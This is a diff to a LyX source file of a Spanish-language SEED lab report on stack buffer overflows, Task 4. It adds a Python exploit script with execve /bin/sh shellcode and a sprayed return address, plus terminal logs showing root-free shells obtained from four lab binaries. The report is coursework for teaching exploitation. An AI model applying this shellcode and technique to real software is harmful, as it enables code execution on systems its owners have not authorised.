@@ -748,7 +748,7 @@ status open
 
 \begin_layout Plain Layout
 
-seed@VM:~/.../code$ python3 exploit.py > badfile
+seed@VM:~/.../code$ python3 exploit.py
 \end_layout
 
 \begin_layout Plain Layout
@@ -824,13 +824,625 @@ Task 4: Launching Attack without Knowing Buffer Size
 \end_layout
 
 \begin_layout Standard
-Para sobreescribir la dirección de retorno sin tener en cuenta el tamaño
- del buffer, una estrategia es agregar varias veces la dirección del buffer
- al final del payload.
+A diferencia del ejercicio anterior, en el cual el tamaño del buffer puede
+ inferirse directamente mediante depuración, en esta tarea se impone la
+ restricción de no derivar el tamaño del buffer durante la investigación,
+ asumiendo únicamente que este se encuentra dentro de un rango acotado (entre
+ 100 y 200 bytes).
+ Más aún se busca que el payload sea lo suficientemente robusto para sobreescrib
+ir buffers de diversos tamaños y que puede modificarse la dirección de retorno,
+ tal como se hizo en el ejercicio anterior.
+ El objetivo del ataque en este caso consiste en lograr que el programa
+ vulnerable ejecute código inyectado, utilizando un único payload válido
+ para cualquier tamaño de buffer dentro de ese rango, minimizando el número
+ de intentos y evitando enfoques de fuerza bruta.
 \end_layout
 
 \begin_layout Standard
-La otra estrategia es determinar el offset mediante fuerza bruta
+Se hacen las siguientes asunciones:
+\end_layout
+
+\begin_layout Itemize
+La dirección del buffer es conocida.
+\end_layout
+
+\begin_layout Itemize
+El tamaño exacto del buffer es desconocido, pero se conoce su rango aproximado.
+\end_layout
+
+\begin_layout Itemize
+La arquitectura es de 32 bits, por lo que las direcciones y el frame pointer
+ están alineados a múltiplos de cuatro bytes.
+\end_layout
+
+\begin_layout Itemize
+No se dispone del binario ni del código fuente del programa objetivo, simulando
+ un entorno de ataque remoto.
+\end_layout
+
+\begin_layout Itemize
+Solo se permite generar un único payload que funcione de manera robusta
+ frente a la variabilidad del tamaño del buffer.
+\end_layout
+
+\begin_layout Standard
+La estrategia se basa en repetir un gran número de veces la dirección de
+ retorno en el payload de manera de no depender de un tamaño fijo de buffer.
+\end_layout
+
+\begin_layout Standard
+Además como el offset entre el buffer y la dirección de retorno puede no
+ estar alineado, puede ser necesario agregar padding al inicio del payload
+ para lograr esta alineación.
+ 
+\end_layout
+
+\begin_layout Standard
+Observar que los argumentos del script son la dirección de retorno elegida
+ y la cantidad de padding requereido.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=pythonstyle,caption={exploit.py - Buffer Overflow Exploit Script}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#!/usr/bin/env python3
+\end_layout
+
+\begin_layout Plain Layout
+
+import struct import sys
+\end_layout
+
+\begin_layout Plain Layout
+
+# Shellcode to spawn /bin/sh (25 bytes)
+\end_layout
+
+\begin_layout Plain Layout
+
+shellcode = (     b"
+\backslash
+x31
+\backslash
+xc0
+\backslash
+x50
+\backslash
+x68
+\backslash
+x2f
+\backslash
+x2f
+\backslash
+x73
+\backslash
+x68"
+\end_layout
+
+\begin_layout Plain Layout
+
+				  b"
+\backslash
+x68
+\backslash
+x2f
+\backslash
+x62
+\backslash
+x69
+\backslash
+x6e
+\backslash
+x89
+\backslash
+xe3
+\backslash
+x50"
+\end_layout
+
+\begin_layout Plain Layout
+
+                  b"
+\backslash
+x53
+\backslash
+x89
+\backslash
+xe1
+\backslash
+x31
+\backslash
+xd2
+\backslash
+x31
+\backslash
+xc0
+\backslash
+xb0"
+\end_layout
+
+\begin_layout Plain Layout
+
+                  b"
+\backslash
+x0b
+\backslash
+xcd
+\backslash
+x80" )
+\end_layout
+
+\begin_layout Plain Layout
+
+# Usage: ./create_shellcode3.py <return_address_hex> [padding_bytes]
+\end_layout
+
+\begin_layout Plain Layout
+
+if len(sys.argv) < 2:
+\end_layout
+
+\begin_layout Plain Layout
+
+    print(f"Usage: {sys.argv[0]} <return_address_hex> [padding_bytes]")
+\end_layout
+
+\begin_layout Plain Layout
+
+    print("Example: ./create_shellcode3.py 0xffffc8a0 40")
+\end_layout
+
+\begin_layout Plain Layout
+
+    sys.exit(1)
+\end_layout
+
+\begin_layout Plain Layout
+
+try:
+\end_layout
+
+\begin_layout Plain Layout
+
+	ret_addr_int = int(sys.argv[1], 16)
+\end_layout
+
+\begin_layout Plain Layout
+
+except ValueError:
+\end_layout
+
+\begin_layout Plain Layout
+
+    print("Invalid return address.
+ Use hex format, e.g., 0xffffc8a0")
+\end_layout
+
+\begin_layout Plain Layout
+
+    sys.exit(1)
+\end_layout
+
+\begin_layout Plain Layout
+
+ret_addr = struct.pack('<I', ret_addr_int)
+\end_layout
+
+\begin_layout Plain Layout
+
+# Optional: number of padding bytes at the beginning padding_bytes = int(sys.argv
+[2]) if len(sys.argv) > 2 else 0
+\end_layout
+
+\begin_layout Plain Layout
+
+REPEAT_COUNT = 100
+\end_layout
+
+\begin_layout Plain Layout
+
+payload = b"A" * padding_bytes + ret_addr * REPEAT_COUNT
+\end_layout
+
+\begin_layout Plain Layout
+
+print("Hex payload:") print(payload.hex())
+\end_layout
+
+\begin_layout Plain Layout
+
+# Add shellcode
+\end_layout
+
+\begin_layout Plain Layout
+
+payload += shellcode
+\end_layout
+
+\begin_layout Plain Layout
+
+print(f"Payload size: {len(payload)} bytes")
+\end_layout
+
+\begin_layout Plain Layout
+
+print(f"Return address repeated {REPEAT_COUNT} times") 
+\end_layout
+
+\begin_layout Plain Layout
+
+print("Exploit written to 'badfile'") 
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+La dirección inyectada es repetida 100 veces para incrementar las chances
+ de sobreescritura de la dirección de retorno del programa vulnerable
+\end_layout
+
+\begin_layout Standard
+A diferencia de un ataque por fuerza bruta, que probaría múltiples tamaños
+ de buffer o múltiples offsets en intentos sucesivos, la estrategia adoptada
+ busca minimizar el número de ejecuciones necesarias, reduciendo la probabilidad
+ de detección y bloqueo.
+ El uso de un único payload generalizado responde directamente a esta restricció
+n y refleja prácticas más realistas desde el punto de vista de la seguridad
+ ofensiva.
+\end_layout
+
+\begin_layout Subsection*
+Resultados obtenidos
+\end_layout
+
+\begin_layout Subsubsection*
+Tamaño de buffer: 100 bytes
+\end_layout
+
+\begin_layout Standard
+La dirección del buffer es 0xffffc8dc pero la dirección de retorno inyectada
+ es 0xffffca6c porque hay una distancia de 400 bytes entre el inicio del
+ payload y el comienzo del shellcode.
+ Debido a que el offset entre el buffer y la dirección de retorno es un
+ múltiplo de 4 no se requiere padding.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=pythonstyle,caption={exploit.py - Buffer Overflow Exploit Script}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L1
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 429
+\end_layout
+
+\begin_layout Plain Layout
+
+[DEBUG] buffer address: 0xffffc8dc
+\end_layout
+
+\begin_layout Plain Layout
+
+Segmentation fault
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./create_shellcode3.py 0xFFFFCA6c
+\end_layout
+
+\begin_layout Plain Layout
+
+Hex payload: 6ccaffff6ccaffff6ccaffff6ccaffff6ccaffff6ccaffff6c....
+\end_layout
+
+\begin_layout Plain Layout
+
+Payload size: 427 bytes
+\end_layout
+
+\begin_layout Plain Layout
+
+Return address repeated 100 times
+\end_layout
+
+\begin_layout Plain Layout
+
+Exploit written to 'badfile'
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L1
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 427
+\end_layout
+
+\begin_layout Plain Layout
+
+[DEBUG] buffer address: 0xffffc8dc $  
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsubsection*
+Tamaño de buffer: 160 bytes
+\end_layout
+
+\begin_layout Standard
+Similar al caso anterior, la dirección del buffer es 0xffffc8a0 pero suman
+ 400 bytes por el offset al comienzo del shellcode.
+ Debido a que el offset entre el buffer y la dirección de retorno es un
+ múltiplo de 4 no se requiere padding.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=pythonstyle,caption={exploit.py - Buffer Overflow Exploit Script}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L2
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 427
+\end_layout
+
+\begin_layout Plain Layout
+
+[DEBUG] buffer address: 0xffffc8a0
+\end_layout
+
+\begin_layout Plain Layout
+
+Segmentation fault
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./create_shellcode3.py 0xffffca30
+\end_layout
+
+\begin_layout Plain Layout
+
+Hex payload: 30caffff30caffff30caffff30caffff30caffff30caffff30caffff30caffff...
+\end_layout
+
+\begin_layout Plain Layout
+
+Payload size: 427 bytes
+\end_layout
+
+\begin_layout Plain Layout
+
+Return address repeated 100 times
+\end_layout
+
+\begin_layout Plain Layout
+
+Exploit written to 'badfile'
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L2
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 427 [DEBUG]
+\end_layout
+
+\begin_layout Plain Layout
+
+buffer address: 0xffffc8a0
+\end_layout
+
+\begin_layout Plain Layout
+
+$ 
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsubsection*
+Tamaño de buffer: 200 bytes
+\end_layout
+
+\begin_layout Standard
+Análogo a los casos anteriores:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=pythonstyle,caption={exploit.py - Buffer Overflow Exploit Script}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L3
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 427
+\end_layout
+
+\begin_layout Plain Layout
+
+[DEBUG] buffer address: 0xffffc878
+\end_layout
+
+\begin_layout Plain Layout
+
+Segmentation fault
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./create_shellcode3.py 0xffffca08
+\end_layout
+
+\begin_layout Plain Layout
+
+Hex payload: 08caffff08caffff08caffff08caffff08caffff08caffff08caffff08caffff08c
+a...
+\end_layout
+
+\begin_layout Plain Layout
+
+Payload size: 427 bytes
+\end_layout
+
+\begin_layout Plain Layout
+
+Return address repeated 100 times
+\end_layout
+
+\begin_layout Plain Layout
+
+Exploit written to 'badfile'
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L3
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 427
+\end_layout
+
+\begin_layout Plain Layout
+
+[DEBUG] buffer address: 0xffffc878
+\end_layout
+
+\begin_layout Plain Layout
+
+$ 
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsubsection*
+Tamaño de buffer: 10 bytes
+\end_layout
+
+\begin_layout Standard
+En este caso es necesario agregar padding al comienzo del payload (0x410x41)
+ porque el offset hasta la dirección de retorno no es un múltiplo de 4.
+ El offset entre el comienzo del payload y el shellcode es de 402 bytes.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=pythonstyle,caption={exploit.py - Buffer Overflow Exploit Script}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L4
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 429
+\end_layout
+
+\begin_layout Plain Layout
+
+[DEBUG] buffer address: 0xffffc936
+\end_layout
+
+\begin_layout Plain Layout
+
+Illegal instruction
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./create_shellcode3.py 0xFFFFCAC8 2
+\end_layout
+
+\begin_layout Plain Layout
+
+Hex payload: 4141c8caffffc8caffffc8caffffc8caffffc8caffffc8caffffc8caffffc8cafff
+f...
+\end_layout
+
+\begin_layout Plain Layout
+
+Payload size: 429 bytes
+\end_layout
+
+\begin_layout Plain Layout
+
+Return address repeated 100 times
+\end_layout
+
+\begin_layout Plain Layout
+
+Exploit written to 'badfile'
+\end_layout
+
+\begin_layout Plain Layout
+
+[12/26/25]seed@VM:~/.../code$ ./stack-L4
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 429
+\end_layout
+
+\begin_layout Plain Layout
+
+[DEBUG] buffer address: 0xffffc936
+\end_layout
+
+\begin_layout Plain Layout
+
+$ 
+\end_layout
+
+\end_inset
+
+
 \end_layout
 
 \begin_layout Section*
